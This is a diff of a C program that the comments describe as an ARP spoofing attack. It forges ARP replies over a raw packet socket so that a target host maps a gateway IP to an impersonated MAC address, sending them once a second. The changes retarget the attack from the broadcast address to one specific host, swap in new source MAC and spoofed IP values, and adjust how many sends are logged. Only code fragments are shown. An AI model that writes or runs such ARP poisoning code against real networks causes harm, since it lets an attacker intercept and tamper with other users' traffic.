@@ -10,7 +10,7 @@
 #include <zconf.h>
 #include "model.h"
 
-#define DEFAULT_DEVICE "eno16777736"
+#define DEFAULT_DEVICE "eth0"
 
 //arp -s 10.1.102.1 70-57-bf-7e-65-68
 
@@ -20,7 +20,7 @@ int main(int argc, char *argv[]) {
     memset(&sin, 0, sizeof(sin));
     sin.sll_family = AF_PACKET;
     sin.sll_halen = htons(6);
-    uint8_t src_mac[] = {0x00, 0x0c, 0x29, 0xc1, 0x09, 0x28};//
+    uint8_t src_mac[] = {0xA4, 0xBB, 0x6D, 0x4C, 0xE3, 0x49};//
     memcpy(sin.sll_addr, src_mac, 6);
     char *interface = DEFAULT_DEVICE;
     if ((sin.sll_ifindex = if_nametoindex(interface)) == 0) {
@@ -33,20 +33,19 @@ int main(int argc, char *argv[]) {
     memset(&data, 0, sizeof(data));
 
     //bro_hw 攻击目标的mac地址
-    uint8_t bro_hw[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };//所有
-//    uint8_t bro_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xdf, 0xe2};//shijie
-//    uint8_t bro_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0xbd};//test
+//    uint8_t bro_hw[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };//所有
+//    uint8_t bro_hw[] = {0x90, 0x9c, 0x4a, 0xbf, 0x6c, 0x71};//mac
+    uint8_t bro_hw[] = {0xA4, 0xBB, 0x6D, 0x4C, 0xE3, 0x49};//me
 
     //(10.1.102.1) at 70:57:bf:7e:65:68 [ether] on eno16777736
     //src_hw 假冒这个人   ip mac
-//    uint8_t src_hw[] = { 0x70, 0x57, 0xbf, 0x7e, 0x65, 0x68 }; //tell
     uint8_t src_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0x11}; //tell
-    uint8_t src_ip[] = {0x0a, 0x01, 0x66, 0x01}; //
+    uint8_t src_ip[] = {0x0a, 0x00, 0xa9, 0x01}; //
 
     //dec_hw 发给攻击目标的   ip mac 映射
     //	uint8_t dec_hw[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //who has
     uint8_t dec_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0x11};
-    uint8_t dec_ip[] = {0x0a, 0x01, 0x66, 0x01};
+    uint8_t dec_ip[] = {0x0a, 0x00, 0xa9, 0x01};
 
     //以太网首部
     printf("create ethhead, ethhdr size=%d字节\r\n", sizeof(struct ethhdr));
@@ -103,7 +102,7 @@ int main(int argc, char *argv[]) {
             exit(EXIT_FAILURE);
         }
         sleep(1);
-        if (i < 5) {
+        if (i < 9) {
             printf("send %d times! \r\n", i);
         }
         i++;
